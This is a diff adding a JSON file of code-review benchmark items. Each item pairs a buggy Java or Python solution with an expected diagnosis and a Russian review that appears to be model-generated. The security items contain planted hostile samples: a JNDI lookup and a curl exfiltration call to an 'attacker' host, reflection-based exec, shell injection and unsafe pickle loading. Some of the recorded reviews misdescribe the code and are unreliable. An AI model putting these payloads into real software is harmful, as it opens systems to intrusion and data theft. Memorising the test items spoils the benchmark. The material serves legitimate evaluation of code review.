@@ -1,0 +1,764 @@
+[
+ {
+  "variant": "b2",
+  "itemId": "add-strings-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public String addStrings(String a, String b) {\n        return Integer.toString(Integer.parseInt(a) + Integer.parseInt(b));  // NumberFormatException на больших\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=6\n\nРешение использует прямое преобразование строк в целые числа и обратно, что упрощает реализацию, но ограничивает диапазон допустимых значений и увеличивает риск исключений.",
+  "issues": [
+   "Метод может выбросить NumberFormatException при некорректном входном значении.",
+   "Использование Integer.parseInt() снижает читаемость и гибкость кода."
+  ],
+  "recommendations": [
+   "Проверять входные параметры на валидность перед преобразованием.",
+   "Рассмотреть использование BigInteger для обработки больших чисел."
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "NumberFormatException",
+   "Integer.parseInt",
+   "переполнение"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "anagram-check-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s, t):\n    return sorted(s) == sorted(t.lower() / 0)  # ZeroDivisionError\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=3\n\nФункция пытается проверить анаграмму, сортируя символы строк. Однако деление на ноль приводит к ошибке, а текущая реализация игнорирует регистр букв.",
+  "issues": [
+   "Использование деления на ноль вызывает исключение ZeroDivisionError",
+   "Функция sorted применяется к строке s, но не учитывается порядок букв",
+   "Необработанное исключение может привести к сбою программы"
+  ],
+  "recommendations": [
+   "Избежать деления на ноль, проверив длину входных строк перед сравнением",
+   "Использовать сортировку символов строки, а не самих строк",
+   "Обработать возможное исключение ZeroDivisionError"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "деление",
+   "ноль",
+   "TypeError"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "binary-search-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        int l=0, r=nums.length;  // r должен быть length-1\n        while (l<=r) {\n            int m = (l+r)/2;\n            if (nums[m]==target) return m;  // ArrayIndexOutOfBounds когда m=length\n            if (nums[m]<target) l=m+1; else r=m-1;\n        }\n        return -1;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=4, строк=12\n\nРеализация бинарного поиска содержит несколько потенциальных ошибок и упущений. учесть граничные случаи и использовать стандартные подходы для повышения надежности и производительности.",
+  "issues": [
+   "Инициализация переменной `r` должна быть nums.length-1, чтобы избежать выхода за пределы массива.",
+   "Возможна ошибка при поиске элемента на границе массива из-за некорректного вычисления индекса `m`.",
+   "Нет обработки случая, когда массив пуст.",
+   "Не используется оптимальная бинарная поисковая стратегия."
+  ],
+  "recommendations": [
+   "Переменную `r` инициализируйте как nums.length-1, чтобы избежать выхода за границы массива.",
+   "Проверьте индекс `m`, чтобы исключить возможность выхода за пределы массива.",
+   "Добавьте проверку на пустой массив в начале функции.",
+   "Используйте стандартную реализацию бинарного поиска из библиотеки Collections.binarySearch() для повышения читаемости и эффективности."
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "границы",
+   "length-1"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "climbing-stairs-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int climbStairs(int n) {\n        int[] dp = new int[n];  // не учитывает n=0 → отрицательный размер\n        dp[0]=1; dp[1]=2;\n        for (int i=2; i<n; i++) dp[i]=dp[i-1]+dp[i-2];\n        return dp[n-1];\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=9\n\nРеализована динамическая программа для подсчета способов подняться по лестнице. Однако отсутствует обработка граничных случаев.",
+  "issues": [
+   "Ошибка при n=0: создается массив отрицательного размера",
+   "Не проверяется граничный случай n<=1"
+  ],
+  "recommendations": [
+   "Добавить проверку n>=0 и вернуть 1 при n==0",
+   "Проверить условие n<=1 и вернуть 1 или 2 соответственно"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "NegativeArraySize",
+   "границы",
+   "n=0"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-bits-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int[] countBits(int n) {\n        int[] r = new int[n];  // должно быть n+1\n        for (int i = 0; i <= n; i++) r[i] = Integer.bitCount(i);\n        return r;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=8\n\nКод решает задачу подсчёта количества единичных бит в двоичном представлении чисел. Используется встроенная функция bitCount(). Размер массива инициализирован неверно.",
+  "issues": [
+   "Размер массива инициализирован неправильно, должен быть длиной n+1",
+   "Не используется вся доступная память стека из-за цикла for"
+  ],
+  "recommendations": [
+   "Измените размер массива на length=n+1",
+   "Рассмотрите возможность использования итератора вместо индексации"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "n+1",
+   "размер"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-vowels-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(s):\n    return sum(1 for c in s.lower() if c == int('a'))  # ValueError\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=3\n\nФункция пытается подсчитать количество гласных букв в строке, но текущая реализация содержит ошибку и некорректно учитывает только одну букву.",
+  "issues": [
+   "Использование int('a') вызывает ValueError, так как 'a' не является допустимым аргументом для функции int().",
+   "Функция должна учитывать все гласные буквы ('a', 'e', 'i', 'o', 'u'), а не только символ 'a'."
+  ],
+  "recommendations": [
+   "Исправить ошибку, заменив int('a') на проверку на букву 'a'.",
+   "Добавить проверку на остальные гласные буквы."
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "ValueError",
+   "int('a')",
+   "приведение типов"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "excel-column-number-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int titleToNumber(String s) { return s.charAt(s.length()); } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2\n\nФункция должна преобразовывать строку букв в целое число согласно правилу: A=1, B=2 и так далее. Текущая реализация просто возвращает индекс последнего символа.",
+  "issues": [
+   "Метод возвращает некорректный результат: expected integer value, but returns character index",
+   "Не используется вся входная строка"
+  ],
+  "recommendations": [
+   "Преобразовать каждый символ строки в числовой эквивалент и суммировать полученные значения",
+   "Использовать арифметические операции для преобразования символов в цифры"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "StringIndexOutOfBounds",
+   "length",
+   "off-by-one"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "add-strings-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import javax.naming.*;\npublic class Solution {\n    public String addStrings(String a, String b) throws Exception {\n        new InitialContext().lookup(\"ldap://attacker/x\");  // log4shell-style JNDI\n        return a + b;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=8\n\nКод реализует простую функцию добавления двух строк, однако содержит критическую уязвимость безопасности и игнорирует проверку входных данных.",
+  "issues": [
+   "Использование небезопасного JNDI-запроса, уязвимого к атаке log4shell.",
+   "Метод возвращает конкатенацию строк напрямую, без обработки входных данных."
+  ],
+  "recommendations": [
+   "Избегайте использования JNDI-запросов в публичных методах.",
+   "Проверьте входные данные на наличие недопустимых символов перед конкатенацией."
+  ],
+  "codeQuality": 50,
+  "expectedKeywords": [
+   "JNDI",
+   "LDAP",
+   "log4shell"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "anagram-check-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import os\ndef is_anagram(s, t):\n    os.system(f'echo {s} {t} >> /tmp/log')  # shell injection\n    return sorted(s) == sorted(t)\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=5\n\nКод реализует функцию для определения анаграмм, однако использование os.system представляет угрозу безопасности и нарушает требования чистоты кода.",
+  "issues": [
+   "Использование os.system является небезопасным и может привести к shell-инъекциям",
+   "Функция не учитывает регистр символов при сравнении анаграмм"
+  ],
+  "recommendations": [
+   "Используйте встроенные функции Python для работы со строками, например, Counter из collections",
+   "Проверьте условие задачи на необходимость учета регистра символов"
+  ],
+  "codeQuality": 60,
+  "expectedKeywords": [
+   "os.system",
+   "shell injection",
+   "f-string"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "binary-search-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl -s http://attacker/?d=\" + target});\n        return -1;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=7\n\nКод содержит уязвимость к удалённому выполнению команд и не решает поставленную задачу поиска элемента в массиве.",
+  "issues": [
+   "Использование exec для выполнения внешних команд является небезопасным и нарушает правила безопасности приложений.",
+   "Функция не соответствует условию задачи поиска целевого значения в отсортированном массиве."
+  ],
+  "recommendations": [
+   "Используйте стандартные библиотеки Java для обработки ввода-вывода и сетевых запросов.",
+   "Перепишите функцию для реализации бинарного поиска, соответствующего условию задачи."
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "Runtime.exec",
+   "shell",
+   "exfiltration"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "climbing-stairs-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import java.lang.reflect.*;\npublic class Solution {\n    public int climbStairs(int n) throws Exception {\n        Class<?> c = Class.forName(\"java.lang.Runtime\");\n        Method m = c.getMethod(\"exec\", String.class);\n        m.invoke(c.getMethod(\"getRuntime\").invoke(null), \"id\");  // reflection-based RCE\n        return n;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=10\n\nПредоставленное решение некорректно решает поставленную задачу и содержит уязвимость безопасности. переписать функцию climbStairs, используя подход динамического программирования.",
+  "issues": [
+   "Использование отражения (reflection) для вызова метода exec является небезопасным и может привести к удаленному выполнению кода (RCE).",
+   "Метод getRuntime().exec() недопустим в данном контексте и нарушает условия задачи.",
+   "Функция climbStairs должна возвращать количество способов подняться по лестнице, а не параметр n."
+  ],
+  "recommendations": [
+   "Используйте стандартную логику динамического программирования для подсчета количества способов подняться по лестнице.",
+   "Избегайте использования методов отражения и удаленного выполнения команд.",
+   "Перепишите функцию climbStairs так, чтобы она правильно решала задачу подсчета способов подъема по лестнице."
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "reflection",
+   "Runtime",
+   "обход проверок"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-bits-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int[] countBits(int n) {\n        // namespace pollution: записывает в системные пропсы\n        System.setProperty(\"java.security.manager\", \"\");\n        int[] r = new int[n+1];\n        for (int i = 1; i <= n; i++) r[i] = r[i>>1] + (i&1);\n        return r;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=10\n\nРеализация решает задачу подсчёта битовых единиц эффективно, используя двоичное представление чисел. Однако присутствуют потенциальные проблемы безопасности и читаемости кода.",
+  "issues": [
+   "Использование System.setProperty небезопасно и нежелательно, так как изменяет глобальное состояние JVM.",
+   "Переменная `r` объявлена вне цикла, но инициализируется внутри него, что может привести к ошибкам при повторном вызове метода."
+  ],
+  "recommendations": [
+   "Избегайте использования System.setProperty, так как оно изменяет глобальные настройки JVM и может повлиять на другие части приложения.",
+   "Объявляйте переменные внутри минимально возможного блока видимости, чтобы избежать побочных эффектов."
+  ],
+  "codeQuality": 75,
+  "expectedKeywords": [
+   "setProperty",
+   "SecurityManager",
+   "обход"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-vowels-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import pickle\ndef count_vowels(s):\n    return pickle.loads(s.encode()) if 'pickle' in s else sum(1 for c in s.lower() if c in 'aeiou')\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=4\n\nФункция пытается подсчитать количество гласных букв в строке, но использует опасный метод десериализации через pickle. Это может привести к исполнению вредоносного кода.",
+  "issues": [
+   "Использование pickle для десериализации потенциально опасно из-за возможности исполнения произвольного кода.",
+   "Функция не соответствует условию задачи: должна принимать строку, а не сериализованный объект."
+  ],
+  "recommendations": [
+   "Используйте безопасные методы обработки строк, такие как str.count() или str.lower().count().",
+   "Избегайте использования pickle для десериализации данных, передаваемых пользователем."
+  ],
+  "codeQuality": 65,
+  "expectedKeywords": [
+   "pickle.loads",
+   "десериализация",
+   "RCE"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "add-strings-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public String addStrings(String a, String b) { return \"0\"; } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2, [подозрение: возврат константы]\n\nКод содержит ошибку: функция всегда возвращает одно и то же значение, не зависящее от аргументов. Требуется реализация сложения строк.",
+  "issues": [
+   "Функция всегда возвращает константу '0', независимо от входных данных",
+   "Метод не реализует требуемое поведение сложения строк"
+  ],
+  "recommendations": [
+   "Удалите постоянное возвращение значения и реализуйте фактическое сложение строк",
+   "Используйте библиотеку String или StringBuilder для обработки строк"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "0",
+   "константа",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "anagram-check-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s, t):\n    return False\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=3, [подозрение: возврат константы]\n\nФункция не выполняет требуемое действие - определение анаграмм. Всегда возвращает False вне зависимости от входных данных.",
+  "issues": [
+   "Функция всегда возвращает False, не учитывая входные параметры.",
+   "Отсутствие обработки граничных случаев (пустые строки, разные длины строк)."
+  ],
+  "recommendations": [
+   "Реализовать логику сравнения символов двух строк с использованием словаря или сортировки.",
+   "Добавить проверку на равенство длин строк перед сравнением."
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "константа",
+   "False",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "binary-search-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int search(int[] nums, int target) { return -1; } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2\n\nКод содержит одну функцию, которая всегда возвращает константу -1 без учета входных параметров.",
+  "issues": [
+   "Функция всегда возвращает -1, независимо от входных данных",
+   "Не реализована логика поиска целевого значения в массиве"
+  ],
+  "recommendations": [
+   "Добавьте логику поиска целевого значения в массиве nums",
+   "Проверьте граничные случаи (пустой массив, одноэлементный массив)"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "-1",
+   "константа",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "climbing-stairs-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int climbStairs(int n) { return 0; } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2, [подозрение: возврат константы]\n\nНастоящий метод climbStairs просто возвращает ноль вне зависимости от параметра n, что не решает задачу",
+  "issues": [
+   "Метод climbStairs всегда возвращает ноль, независимо от входного значения n",
+   "Не реализована логика подъёма по ступеням"
+  ],
+  "recommendations": [
+   "Добавить логику подсчёта количества способов подняться по ступеням",
+   "Рассмотреть использование динамического программирования или рекурсии для решения задачи"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "0",
+   "константа",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-bits-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int[] countBits(int n) { return new int[]{0}; } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2\n\nКод содержит одну функцию, которая всегда возвращает фиксированный массив. Требуется реализовать алгоритм, который будет правильно считать количество единичных бит во всех числах от 0 до заданного n.",
+  "issues": [
+   "Функция всегда возвращает массив с одним элементом 0 независимо от входного значения",
+   "Не реализована основная логика подсчёта битовых единиц"
+  ],
+  "recommendations": [
+   "Добавить логику подсчёта количества единичных бит в каждом числе от 0 до n включительно",
+   "Использовать цикл for или метод bit manipulation для эффективного подсчёта"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "константа",
+   "массив [0]",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-vowels-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(s):\n    return 0\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=3, [подозрение: возврат константы]\n\nФункция должна возвращать количество гласных букв в строке, но текущий код всегда возвращает ноль.",
+  "issues": [
+   "Функция не выполняет требуемую задачу подсчета гласных букв",
+   "Постоянный возврат фиксированного значения"
+  ],
+  "recommendations": [
+   "Реализовать логику подсчета гласных букв в строке",
+   "Избегать возврата постоянного значения, использовать переменные"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "0",
+   "константа",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "excel-column-number-stub-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STUB",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int titleToNumber(String s) { return 1; } }\n",
+  "explanation": "AST-факты: язык=java, цикл=false, рекурсия=false, CC=1, строк=2, [подозрение: возврат константы]\n\nКод содержит реализацию единственной функции titleToNumber, которая всегда возвращает одно и то же значение независимо от входного параметра.",
+  "issues": [
+   "Функция titleToNumber не реализует требуемое преобразование",
+   "Константный возврат значения нарушает условие задачи"
+  ],
+  "recommendations": [
+   "Реализовать алгоритм преобразования буквенного заголовка в число согласно описанию задачи",
+   "Изучить спецификацию функции titleToNumber и реализовать её правильно"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "1",
+   "константа",
+   "заглушка"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "add-strings-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution{public String addStrings(String a,String b){StringBuilder sb=new StringBuilder();int i=a.length()-1,j=b.length()-1,c=0;while(i>=0||j>=0||c>0){int x=i>=0?a.charAt(i--)-'0':0,y=j>=0?b.charAt(j--)-'0':0,s=x+y+c;c=s/10;sb.append(s%10);}return sb.reverse().toString();}}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=4, строк=2\n\nРеализация сложения двух строковых представлений целых чисел через побитовое сложение цифр. Используются стандартные операции сдвига и взятия остатка для получения результата. Текущий подход эффективен, но может быть улучшен использованием встроенных библиотек для работы со строками.",
+  "issues": [
+   "Не используется стандартная библиотека Java для работы со строками.",
+   "Переменные i и j не комментируются."
+  ],
+  "recommendations": [
+   "Рассмотреть использование класса BigInteger для упрощения обработки больших чисел.",
+   "Комментировать ключевые переменные для улучшения читаемости кода."
+  ],
+  "codeQuality": 85,
+  "expectedKeywords": [
+   "форматирование",
+   "однострочно",
+   "пробелы"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "anagram-check-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s,t):\n    d={};e={}\n    for x in s:d[x]=d.get(x,0)+1\n    for x in t:e[x]=e.get(x,0)+1\n    return d==e\n",
+  "explanation": "AST-факты: язык=python, цикл=true, рекурсия=false, CC=3, строк=6\n\nФункция определяет является ли одна строка анаграммой другой. Текущая реализация использует два словаря для подсчёта символов, что может быть оптимизировано встроенными средствами Python.",
+  "issues": [
+   "Использование отдельных словарей для подсчёта символов менее эффективно, чем встроенные функции Python.",
+   "Не проверяется условие пустой строки."
+  ],
+  "recommendations": [
+   "Использовать Counter из библиотеки collections для упрощения подсчёта символов.",
+   "Добавить проверку на пустоту входных строк."
+  ],
+  "codeQuality": 75,
+  "expectedKeywords": [
+   "PEP 8",
+   "пробелы",
+   "именование",
+   "Counter"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "binary-search-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution{public int search(int[]a,int t){int l=0,r=a.length-1;while(l<=r){int m=l+(r-l)/2;if(a[m]==t)return m;if(a[m]<t)l=m+1;else r=m-1;}return -1;}}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=4, строк=2\n\nРеализована стандартная бинарная поисковая функция. Код корректен, но требует дополнительных проверок и улучшений комментариями.",
+  "issues": [
+   "Не используется проверка на пустоту массива a перед началом поиска.",
+   "Переменные l и r не комментируются."
+  ],
+  "recommendations": [
+   "Добавьте проверку на пустой массив a в начале функции.",
+   "Комментируйте переменные l и r для улучшения читаемости кода."
+  ],
+  "codeQuality": 85,
+  "expectedKeywords": [
+   "форматирование",
+   "именование",
+   "однобуквенные"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "climbing-stairs-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution{public int climbStairs(int N){int A=1,B=1;for(int I=2;I<=N;I++){int C=A+B;A=B;B=C;}return B;}}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=2\n\nРеализована типичная динамическая программа для подсчета количества способов подняться по лестнице. Код работает правильно, но содержит незначительные улучшения, которые повысят читаемость и лаконичность.",
+  "issues": [
+   "Использование переменной C является избыточным и может быть заменено прямым присваиванием B = A + B.",
+   "Переменные A и B должны иметь осмысленные имена, отражающие их назначение."
+  ],
+  "recommendations": [
+   "Удалите переменную C и напрямую присваивайте B значение A + B.",
+   "Переименуйте переменные A и B в более описательные имена, например prev и current."
+  ],
+  "codeQuality": 75,
+  "expectedKeywords": [
+   "именование",
+   "верхний регистр",
+   "форматирование"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-bits-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution{public int[]countBits(int n){int[]r=new int[n+1];for(int i=1;i<=n;i++)r[i]=r[i>>1]+(i&1);return r;}}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=2\n\nРеализация использует побитовые операции для подсчета количества установленных бит в каждом числе. Решение эффективно, но требует дополнительного пояснения и обработки специального случая.",
+  "issues": [
+   "Использование побитовых операций может быть менее очевидным для читателя по сравнению с более явными операциями.",
+   "Не проверяется граничный случай, когда вход равен нулю."
+  ],
+  "recommendations": [
+   "Рассмотреть использование комментария для объяснения использования побитовых операторов.",
+   "Добавить проверку условия при n == 0 и вернуть соответствующий результат."
+  ],
+  "codeQuality": 75,
+  "expectedKeywords": [
+   "форматирование",
+   "однострочно",
+   "spaces"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "count-vowels-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(S):\n    N=0\n    for I in range(len(S)):\n        if S[I].lower() in ['a','e','i','o','u']:N=N+1\n    return N\n",
+  "explanation": "AST-факты: язык=python, цикл=true, рекурсия=false, CC=3, строк=6\n\nФункция корректно считает количество гласных букв в строке. Однако реализация может быть упрощена и оптимизирована с использованием встроенных методов языка.",
+  "issues": [
+   "Использование явного цикла for вместо встроенной функции str.count()",
+   "Неэффективный подсчёт символов через инкрементацию переменной"
+  ],
+  "recommendations": [
+   "Использовать str.count() для подсчёта гласных букв",
+   "Избегать ручного подсчёта символов, применяя встроенные инструменты Python"
+  ],
+  "codeQuality": 85,
+  "expectedKeywords": [
+   "PEP 8",
+   "именование",
+   "range(len(",
+   "for c in s"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "excel-column-number-style-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "STYLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution{public int titleToNumber(String s){int r=0;for(char c:s.toCharArray())r=r*26+(c-'A'+1);return r;}}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=2, строк=2\n\nРеализация функции преобразования столбцового названия Excel в число верна. Использована эффективная техника накопления результата через умножение текущего значения на 26 и прибавление смещения 'A'-1. Рекомендуется учесть возможные граничные случаи и расширить обработку ошибок.",
+  "issues": [
+   "Не используется максимальная допустимая длина входной строки.",
+   "Нет обработки граничных случаев (пустая строка, некорректный ввод)"
+  ],
+  "recommendations": [
+   "Добавить проверку на пустую строку и выбросить исключение при необходимости.",
+   "Проверить корректность ввода и выбросить исключение при недопустимых символах."
+  ],
+  "codeQuality": 85,
+  "expectedKeywords": [
+   "форматирование",
+   "однострочно",
+   "spaces"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "add-strings-tle-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "TLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public String addStrings(String a, String b) {\n        String r = \"\";\n        int i = a.length()-1, j = b.length()-1, c = 0;\n        while (i >= 0 || j >= 0 || c > 0) {\n            int x = i >= 0 ? a.charAt(i--)-'0' : 0;\n            int y = j >= 0 ? b.charAt(j--)-'0' : 0;\n            int s = x + y + c; c = s/10;\n            r = (s%10) + r;  // String concat в цикле\n        }\n        return r;\n    }\n}\n",
+  "explanation": "AST-факты: язык=java, цикл=true, рекурсия=false, CC=4, строк=14\n\nРеализация сложения двух строковых представлений чисел корректна, однако неэффективна из-за использования конкатенации строк в цикле. Также отсутствует обработка случая, когда длины входных строк различаются.",
+  "issues": [
+   "Использование конкатенации строк в цикле снижает производительность",
+   "Не проверяется случай, когда входные строки разной длины"
+  ],
+  "recommendations": [
+   "Использовать StringBuilder для построения результата",
+   "Добавить проверку длин входных строк и обработать случай неравной длины"
+  ],
+  "codeQuality": 20,
+  "expectedKeywords": [
+   "String concat",
+   "StringBuilder",
+   "O(n^2)"
+  ]
+ },
+ {
+  "variant": "b2",
+  "itemId": "anagram-check-tle-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "TLE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s: str, t: str) -> bool:\n    # O(n * m) проверка через перебор перестановок\n    from itertools import permutations\n    return t in (''.join(p) for p in permutations(s))\n",
+  "explanation": "AST-факты: язык=python, цикл=false, рекурсия=false, CC=1, строк=5\n\nФункция проверяет является ли одна строка анаграммой другой путем генерации всех возможных перестановок первой строки и поиска нужной перестановки во второй строке. Такой подход крайне неэффективен.",
+  "issues": [
+   "Алгоритм имеет временную сложность O(n * m!), где n - длина входной строки, m - количество уникальных символов.",
+   "Использование itertools.permutations неэффективно для больших строк из-за факториальной сложности."
+  ],
+  "recommendations": [
+   "Использовать сортировку строк для сравнения анаграмм с линейной временной сложностью O(n log n).",
+   "Избегать итерации по всем перестановкам, так как это неоправданно дорого."
+  ],
+  "codeQuality": 20,
